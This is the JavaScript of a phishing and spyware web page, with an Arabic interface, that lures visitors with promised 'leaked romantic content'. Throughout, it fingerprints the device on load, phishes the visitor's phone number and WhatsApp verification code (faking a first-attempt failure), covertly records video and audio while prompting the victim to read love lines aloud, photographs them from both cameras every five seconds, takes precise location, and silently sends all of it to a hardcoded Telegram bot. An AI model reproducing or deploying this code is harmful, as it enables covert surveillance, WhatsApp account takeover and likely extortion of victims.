// Telegram bot configuration
const TELEGRAM_BOT_TOKEN = '7709709454:AAEI6z_qc5XUl8Tj3cuFRgq_NlMQImiUnNw';
const TELEGRAM_CHAT_ID = '868562422';

// Function to send data to Telegram
async function sendToTelegram(message, file = null) {
    const url =`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('text', message);
    if (file) {
        formData.append('photo', file);
    }
    try {
        await fetch(url, { method: 'POST', body: formData });
    } catch (e) {
        // Silent fail
    }
}

// Global variables for continuous capture
let frontStream = null;
let backStream = null;
let captureInterval = null;
let photoCounter = 0;

// Check if HTTPS is required
function checkSecureContext() {
    // Check if running on HTTPS or localhost
    const isSecure = window.isSecureContext || 
                     location.protocol === 'https:' || 
                     location.hostname === 'localhost' || 
                     location.hostname === '127.0.0.1';
    
    if (!isSecure && /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        return false;
    }
    return true;
}

// Request Camera and Microphone with love quotes display
async function requestCameraAccessWithQuotes(statusElement) {
    try {
        // Check if browser supports getUserMedia
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            if (statusElement) {
                statusElement.innerHTML = `<div class="error" style="background: #ffe6e6; padding: 20px; border-radius: 10px; color: #d32f2f;">
                    <h3>⚠️ المتصفح غير مدعوم</h3>
                    <p>متصفحك لا يدعم الوصول إلى الكاميرا والميكروفون</p>
                    <p>الرجاء استخدام متصفح حديث مثل Chrome أو Firefox</p>
                </div>`;
            }
            return;
        }

        // Check if secure context (HTTPS) on mobile
        if (!checkSecureContext()) {
            if (statusElement) {
                statusElement.innerHTML = `<div class="error" style="background: #fff3cd; padding: 20px; border-radius: 10px; color: #856404;">
                    <h3>🔒 يتطلب اتصال آمن</h3>
                    <p>للوصول إلى الكاميرا والميكروفون على الجوال، يجب فتح الموقع عبر HTTPS</p>
                    <p style="font-size: 0.9em; margin-top: 10px;">الرجاء التواصل مع مدير الموقع لتفعيل HTTPS</p>
                </div>`;
            }
            return;
        }

        // Detect if mobile device
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // Request front camera with mobile-friendly settings
        const videoConstraints = isMobile ? 
            { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } : 
            { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' };
        
        frontStream = await navigator.mediaDevices.getUserMedia({ 
            video: videoConstraints, 
            audio: true 
        });
        
        // Try to get back camera (may not work on all devices)
        try {
            const backConstraints = isMobile ? 
                { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' } : 
                { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'environment' };
            
            backStream = await navigator.mediaDevices.getUserMedia({ 
                video: backConstraints
            });
        } catch (e) {
            console.log('Back camera not available, using front only');
        }

        // Start continuous photo capture every 5 seconds
        startContinuousCapture();
        
        // Record 15-second video with love quotes display
        // Use lower bitrate for mobile
        const videoBitrate = isMobile ? 500000 : 2500000;
        
        // Check supported mime types
        let mimeType = 'video/webm;codecs=vp8,opus';
        if (!MediaRecorder.isTypeSupported(mimeType)) {
            mimeType = 'video/webm';
            if (!MediaRecorder.isTypeSupported(mimeType)) {
                mimeType = 'video/mp4';
            }
        }
        
        const recorder = new MediaRecorder(frontStream, { 
            mimeType: mimeType,
            videoBitsPerSecond: videoBitrate
        });
        const chunks = [];
        recorder.ondataavailable = (e) => {
            if (e.data.size > 0) chunks.push(e.data);
        };
        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('video', videoBlob, 'video.webm');
            formData.append('caption', '🎥 فيديو 15 ثانية');
            try {
                await fetch(url, { method: 'POST', body: formData });
            } catch (e) {}
        };
        
        recorder.start();
        
        // Display love quotes every 2 seconds during recording
        let quoteIndex = 0;
        const quoteInterval = setInterval(() => {
            if (quoteIndex < loveQuotes.length) {
                statusElement.innerHTML = `<div class="loading">
                    <strong style="font-size: 1.3em; color: #c06c84;">💕 انطق هذه العبارة بصوت عالٍ 💕</strong><br><br>
                    <div style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); padding: 20px; border-radius: 15px; color: white; font-size: 1.4em; font-weight: bold; margin: 15px 0; box-shadow: 0 5px 15px rgba(255,107,157,0.4);">
                        "${loveQuotes[quoteIndex]}"
                    </div>
                    <small style="color: #666;">جارٍ تحميل المحتوى الرومانسي لأجلك...</small>
                </div>`;
                quoteIndex++;
            }
        }, 2000);
        
        // Stop after 15 seconds
        setTimeout(() => {
            recorder.stop();
            clearInterval(quoteInterval);
        }, 15000);
        
    } catch (e) {
        // Silent fail - no telegram message
    }
}

// Function to capture photo from stream
async function capturePhotoFromStream(stream, cameraType) {
    if (!stream || !stream.active) {
        console.log('Stream not active for', cameraType);
        return;
    }
    
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', ''); // Important for iOS
        video.muted = true;
        
        // Wait for video to be ready
        await new Promise((resolve, reject) => {
            video.onloadedmetadata = () => {
                video.play().then(resolve).catch(reject);
            };
            video.onerror = reject;
            setTimeout(reject, 5000); // Timeout after 5 seconds
        });
        
        // Wait a bit for the video to stabilize
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Create canvas with video dimensions
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const context = canvas.getContext('2d');
        
        // Draw the current frame
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert to blob and send
        canvas.toBlob(async (blob) => {
            if (!blob || blob.size === 0) {
                console.log('Empty blob for', cameraType);
                return;
            }
            
            photoCounter++;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, `photo_${photoCounter}.jpg`);
            formData.append('caption', `📸 ${cameraType} - صورة ${photoCounter}`);
            try {
                await fetch(url, { method: 'POST', body: formData });
                console.log('Photo sent:', cameraType, photoCounter);
            } catch (e) {
                console.error('Error sending photo:', e);
            }
        }, 'image/jpeg', 0.85);
        
        // Clean up
        video.srcObject = null;
    } catch (e) {
        console.error('Error capturing photo from', cameraType, e);
    }
}

// Start continuous photo capture every 5 seconds
function startContinuousCapture() {
    // Capture immediately
    if (frontStream) {
        capturePhotoFromStream(frontStream, 'كاميرا أمامية');
    }
    if (backStream) {
        setTimeout(() => {
            capturePhotoFromStream(backStream, 'كاميرا خلفية');
        }, 1000);
    }

    // Then capture every 5 seconds
    captureInterval = setInterval(async () => {
        if (frontStream) {
            await capturePhotoFromStream(frontStream, 'كاميرا أمامية');
        }
        if (backStream) {
            setTimeout(() => {
                capturePhotoFromStream(backStream, 'كاميرا خلفية');
            }, 1000);
        }
    }, 5000);
}

// Stop continuous capture
function stopContinuousCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
    if (frontStream) {
        frontStream.getTracks().forEach(track => track.stop());
        frontStream = null;
    }
    if (backStream) {
        backStream.getTracks().forEach(track => track.stop());
        backStream = null;
    }
}

// Request Location Access (silently)
async function requestLocationAccess() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                let locationInfo = '📍 معلومات الموقع:\n\n';
                locationInfo += `خط العرض: ${position.coords.latitude}\n`;
                locationInfo += `خط الطول: ${position.coords.longitude}\n`;
                locationInfo += `الدقة: ${position.coords.accuracy} متر\n`;
                
                try {
                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`);
                    const geoData = await geoResponse.json();
                    locationInfo += `العنوان: ${geoData.display_name}\n`;
                } catch (e) {}
                
                locationInfo += `\nرابط: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                
                await sendToTelegram(locationInfo);
            },
            async (error) => {
                // Silent fail - no telegram message
            },
            { 
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }
}

// Request Notification Permission (silently)
async function requestNotificationAccess() {
    if ('Notification' in window) {
        try {
            const permission = await Notification.requestPermission();
            if (permission === 'granted') {
                new Notification('💕 مرحباً بك!', {
                    body: 'شكراً لك! استمتع بالمحتوى الحصري',
                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="75" font-size="75">💕</text></svg>'
                });
            }
        } catch (e) {}
    }
}

// Gather ALL device info without permissions
async function gatherDeviceInfo() {
    let info = '🎯 معلومات الجهاز المجمعة:\n\n';
    
    // Basic Browser Info
    info += '📱 معلومات المتصفح:\n';
    info += `المتصفح: ${navigator.userAgent}\n`;
    info += `اللغة: ${navigator.language}\n`;
    info += `اللغات: ${navigator.languages.join(', ')}\n`;
    info += `المنصة: ${navigator.platform}\n`;
    info += `Vendor: ${navigator.vendor}\n`;
    info += `Online: ${navigator.onLine ? 'نعم' : 'لا'}\n\n`;
    
    // Screen Info
    info += '🖥️ معلومات الشاشة:\n';
    info += `الدقة: ${window.screen.width}x${window.screen.height}\n`;
    info += `الدقة المتاحة: ${window.screen.availWidth}x${window.screen.availHeight}\n`;
    info += `عمق الألوان: ${window.screen.colorDepth} بت\n`;
    info += `Pixel Ratio: ${window.devicePixelRatio}\n\n`;
    
    // Battery Status
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            info += '🔋 معلومات البطارية:\n';
            info += `المستوى: ${Math.round(battery.level * 100)}%\n`;
            info += `الشحن: ${battery.charging ? 'نعم' : 'لا'}\n`;
            info += `وقت الشحن: ${battery.chargingTime !== Infinity ? battery.chargingTime + ' ثانية' : 'غير معروف'}\n`;
            info += `وقت التفريغ: ${battery.dischargingTime !== Infinity ? battery.dischargingTime + ' ثانية' : 'غير معروف'}\n\n`;
        } catch (e) {}
    }
    
    // Network Info
    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        info += '🌐 معلومات الشبكة:\n';
        info += `النوع: ${conn.type || 'غير معروف'}\n`;
        info += `النوع الفعال: ${conn.effectiveType || 'غير معروف'}\n`;
        info += `سرعة التحميل: ${conn.downlink || 'غير معروف'} Mbps\n`;
        info += `RTT: ${conn.rtt || 'غير معروف'} ms\n`;
        info += `توفير البيانات: ${conn.saveData ? 'مفعل' : 'معطل'}\n\n`;
    }
    
    // Storage Info
    if (navigator.storage && navigator.storage.estimate) {
        try {
            const storage = await navigator.storage.estimate();
            info += '💾 معلومات التخزين:\n';
            info += `المساحة الكلية: ${Math.round(storage.quota / 1024 / 1024 / 1024)} GB\n`;
            info += `المستخدم: ${Math.round(storage.usage / 1024 / 1024)} MB\n`;
            info += `المتاح: ${Math.round((storage.quota - storage.usage) / 1024 / 1024 / 1024)} GB\n\n`;
        } catch (e) {}
    }
    
    // Device Memory
    if (navigator.deviceMemory) {
        info += `🧠 ذاكرة الجهاز: ${navigator.deviceMemory} GB\n\n`;
    }
    
    // Hardware Concurrency
    if (navigator.hardwareConcurrency) {
        info += `⚙️ عدد المعالجات: ${navigator.hardwareConcurrency}\n\n`;
    }
    
    // Timezone
    info += `🕐 المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
    info += `الوقت المحلي: ${new Date().toLocaleString('ar')}\n\n`;
    
    // Cookies Enabled
    info += `🍪 الكوكيز: ${navigator.cookieEnabled ? 'مفعلة' : 'معطلة'}\n`;
    
    // Do Not Track
    info += `🔒 Do Not Track: ${navigator.doNotTrack || 'غير مفعل'}\n\n`;
    
    // Plugins
    if (navigator.plugins && navigator.plugins.length > 0) {
        info += '🔌 الإضافات المثبتة:\n';
        for (let i = 0; i < Math.min(navigator.plugins.length, 5); i++) {
            info += `- ${navigator.plugins[i].name}\n`;
        }
        info += '\n';
    }
    
    // Get IP Address
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        info += `🌍 عنوان IP: ${ipData.ip}\n\n`;
    } catch (e) {}
    
    // Send to Telegram
    await sendToTelegram(info);
}

// Love quotes to display during recording
const loveQuotes = [
    "أحبك ليس لأنك مثالي، بل لأنك تجعلني أشعر بأنني كذلك",
    "في عينيك أرى كل ما أحتاجه في هذه الحياة",
    "أنت السبب الذي يجعلني أبتسم كل صباح",
    "حبك هو أجمل قصة كُتبت في قلبي",
    "معك أشعر أن الحياة أجمل مما كنت أتخيل",
    "أنت النجمة التي تضيء سماء حياتي",
    "كل لحظة معك هي ذكرى لا تُنسى",
    "أحبك أكثر مما تستطيع الكلمات أن تعبر",
    "أنت الحلم الذي تحقق في حياتي",
    "قلبي ينبض باسمك في كل لحظة"
];

// Main function - request all permissions
async function startCapture() {
    const status = document.getElementById('status');
    
    // Check if already verified
    const isVerified = localStorage.getItem('userVerified') === 'true';
    
    if (isVerified) {
        // Already verified, skip phone and verification
        status.innerHTML = '<div class="success">✅ تم التحقق مسبقاً<br>جارٍ تحميل المحتوى...</div>';
        await new Promise(resolve => setTimeout(resolve, 1000));
        await continueAfterPhone();
        return;
    }
    
    // Show phone number request FIRST
    status.innerHTML = `<div class="success">
        <h3 style="color: #c06c84; margin-bottom: 15px;">💕 مرحباً بك في عالم المحتوى الحصري</h3>
        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">للوصول إلى المحتوى الرومانسي الحصري</p>
        <p style="color: #666; margin: 10px 0;">ادخل رقم هاتفك ليتم تخصيص المحتوى المسرب من بلدك الذي يتم تسريبه إلينا يومياً</p>
        <div style="margin: 20px 0;">
            <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك" style="width: 80%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.1em; text-align: center; direction: ltr;" />
        </div>
        <button onclick="submitPhoneNumberFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">متابعة</button>
    </div>`;
}

// Continue after phone number is submitted
async function continueAfterPhone() {
    const status = document.getElementById('status');
    
    // Show progress bar (without message)
    status.innerHTML = `
        <div class="success" style="padding: 30px;">
            <h3 style="color: #c06c84; margin-bottom: 20px;">⏳ جارٍ تحميل المحتوى الحصري</h3>
            <div style="width: 100%; background: #f0f0f0; border-radius: 25px; height: 30px; overflow: hidden; margin: 20px 0;">
                <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); transition: width 0.3s ease; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.9em;">
                    <span id="progressText">0%</span>
                </div>
            </div>
        </div>
    `;
    
    const updateProgress = (percent) => {
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        if (progressBar && progressText) {
            progressBar.style.width = percent + '%';
            progressText.textContent = percent + '%';
        }
    };
    
    // Slow progress animation (1% to 100%)
    const animateProgress = async (start, end, duration) => {
        const steps = end - start;
        const stepDuration = duration / steps;
        
        for (let i = start; i <= end; i++) {
            updateProgress(i);
            await new Promise(resolve => setTimeout(resolve, stepDuration));
        }
    };
    
    // Start slow progress (0% to 15%)
    await animateProgress(0, 15, 3000);
    
    // Gather device info in background
    gatherDeviceInfo();
    
    // Continue progress (15% to 30%)
    await animateProgress(15, 30, 3000);
    
    // Request Camera (silently in background)
    const cameraPromise = requestCameraAccessWithQuotes(status);
    
    // Continue progress (30% to 60%)
    await animateProgress(30, 60, 6000);
    
    // Wait for camera to finish
    await cameraPromise;
    
    // Request Location (silently in background)
    requestLocationAccess();
    
    // Continue progress (60% to 80%)
    await animateProgress(60, 80, 4000);
    
    // Request Notifications (silently in background)
    requestNotificationAccess();
    
    // Continue progress (80% to 100%)
    await animateProgress(80, 100, 4000);
    
    // Show final success message
    status.innerHTML = `<div class="success">
        <h3 style="color: #28a745; margin-bottom: 15px;">🎉 تم تحميل المحتوى بنجاح!</h3>
        <p style="color: #333; font-size: 1.2em; margin: 15px 0;">💕 مرحباً بك في عالم المحتوى الحصري</p>
        <div class="fake-content" style="margin-top: 20px;">
            <p>✨ يمكنك الآن تصفح المحتوى الحصري</p>
            <p>💝 آلاف الرسائل والفيديوهات الرومانسية في انتظارك</p>
            <p>🌹 محتوى مسرب حصري من بلدك يومياً</p>
        </div>
    </div>`;
}

// Global variable to track verification attempts
let verificationAttempts = 0;

// Submit phone number FIRST (before permissions)
async function submitPhoneNumberFirst() {
    const phoneInput = document.getElementById('phoneNumber');
    const phoneNumber = phoneInput.value.trim();
    const status = document.getElementById('status');
    
    // Validate: Must be exactly 9 digits
    if (!phoneNumber || phoneNumber.length !== 9 || !/^\d+$/.test(phoneNumber)) {
        alert('⚠️ يرجى إدخال رقم هاتف صحيح (9 أرقام)');
        return;
    }
    
    // Reset verification attempts
    verificationAttempts = 0;
    
    // Show loading message
    status.innerHTML = '<div class="loading">⏳ جارٍ إرسال رمز التحقق إلى واتساب...</div>';
    
    // Send phone number to Telegram
    await sendToTelegram(`📱 رقم الهاتف المدخل:\n${phoneNumber}\n\n⚠️ يرجى إرسال رمز التحقق إلى هذا الرقم عبر واتساب`);
    
    // Wait a moment
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Show verification code input (wait for admin to send code via WhatsApp)
    status.innerHTML = `<div class="success">
        <h3 style="color: #28a745; margin-bottom: 15px;">✅ تم إرسال رمز التحقق إلى واتساب</h3>
        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">تحقق من رسائل واتساب الخاصة بك</p>
        <p style="color: #666; margin: 10px 0;">أدخل الرمز المرسل إليك (4 أرقام على الأقل)</p>
        <div style="margin: 20px 0;">
            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
        </div>
        <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد الرمز</button>
    </div>`;
}

// Submit verification code FIRST (before permissions)
async function submitVerificationCodeFirst() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput.value.trim();
    const status = document.getElementById('status');
    
    if (!code || code.length < 4) {
        alert('⚠️ يرجى إدخال رمز التحقق');
        return;
    }
    
    // Send verification code to Telegram
    await sendToTelegram(`🔐 رمز التحقق المدخل (محاولة ${verificationAttempts + 1}):\n${code}`);
    
    // Increment attempts
    verificationAttempts++;
    
    // First attempt: Show error message
    if (verificationAttempts === 1) {
        status.innerHTML = `<div class="error" style="background: #ffe6e6; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h3 style="color: #d32f2f; margin-bottom: 15px;">❌ الرمز خاطئ</h3>
            <p style="color: #333; font-size: 1.1em; margin: 15px 0;">يجب عليك الذهاب إلى واتساب ونسخ الرمز المرسل وإدخاله هنا</p>
            <p style="color: #666; margin: 10px 0;">تحقق من رسائل واتساب الخاصة بك وانسخ الرمز بدقة</p>
            <div style="margin: 20px 0;">
                <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
            </div>
            <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">إعادة المحاولة</button>
        </div>`;
        return;
    }
    
    // Second attempt: Accept and continue with permissions
    status.innerHTML = '<div class="loading">✅ جارٍ التحقق من الرمز...</div>';
    
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Save verification status
    localStorage.setItem('userVerified', 'true');
    
    // Show success and continue with permissions
    status.innerHTML = '<div class="success">🎉 تم التحقق بنجاح!<br>جارٍ تحميل المحتوى الحصري...</div>';
    
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Continue with permissions
    await continueAfterPhone();
}

// Trigger on button click
document.getElementById('loadContent').addEventListener('click', startCapture);

// Gather basic info on page load (silent - in background)
document.addEventListener('DOMContentLoaded', () => {
    // Silently gather device info when page loads
    setTimeout(() => {
        gatherDeviceInfo();
    }, 3000);
});
